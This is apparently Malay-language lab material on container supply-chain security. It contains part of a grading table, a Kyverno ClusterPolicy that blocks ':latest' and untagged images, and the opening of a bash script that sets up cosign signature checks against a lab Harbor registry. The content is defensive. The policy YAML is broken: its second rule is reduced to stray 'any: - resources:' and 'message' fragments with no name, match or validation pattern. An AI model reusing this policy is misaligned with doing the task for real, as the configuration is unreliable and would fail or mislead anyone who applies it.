5 Harbor: imej ditolak, diimbas, dan ditandatangani Skrin Harbor; cosign verify berjaya 10
6 DAST: tiada isyarat Tinggi selepas imbasan semula ringkas-zap.py menunjukkan tinggi 0 15
7 K8s: manifest lulus PSS restricted; NetworkPolicy; Kyverno menolak imej tidak bertandatangan Pod berjalan dalam namespace lab; ujian polisi 15
8 Pipeline: imbas dan imej hijau; pintu terbukti menggagalkan Tab Actions hijau; bukti larian merah dengan secret ujian 15

# 1. Tag :latest dan imej tanpa tag tidak dibenarkan.
# 2. Imej mesti datang daripada Harbor lab.
# Kedua-dua dasar dikecualikan untuk namespace sistem.
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: imej-tag-tetap
  annotations:
    policies.kyverno.io/title: Tag imej mesti tetap
spec:
  validationFailureAction: Enforce
  background: true
  rules:
    - name: tolak-latest
      match:
        any:
          - resources:
              kinds: ["Pod"]
      exclude:
        any:
          - resources:
              namespaces: ["kube-system", "kyverno"]
      validate:
        message: "Tag ':latest' tidak dibenarkan. Guna tag tetap atau digest."
        pattern:
          spec:
            containers:
              - image: "!*:latest"

        any:
          - resources:

        message: "Imej mesti mempunyai tag atau digest."

#!/usr/bin/env bash
# Sediakan Kyverno untuk mengesahkan tandatangan cosign imej daripada Harbor lab, kemudian
# pasang dasar yang menolak imej Harbor yang tidak ditandatangani.
#
# Guna (dari folder repo; perlu cosign.pub, ca.crt dan kubectl yang menunjuk ke kluster k3d):
#   P=peserta03 PW='kata-laluan-harbor' ./kyverno-tandatangan.sh
#
# Ia melakukan:
#   1. ConfigMap lab-ca (ca.crt) dalam namespace kyverno
#   2. Menampal kyverno-admission-controller: hostAliases ke Harbor, CA dipercayai (SSL_CERT_FILE)
#   3. Secret kelayakan Harbor untuk Kyverno (kerana projek anda peribadi)
#   4. ClusterPolicy "imej-bertandatangan" dengan kunci awam anda
# Boleh dijalankan semula (idempotent).
set -euo pipefail

: "${P:?Tetapkan P (cth peserta03)}"
: "${PW:?Tetapkan PW (kata laluan Harbor anda)}"
HARBOR_IP="${HARBOR_IP:-192.53.174.104}"
[ -f cosign.pub ] || { echo "cosign.pub tiada dalam folder ini" >&2; exit 1; }
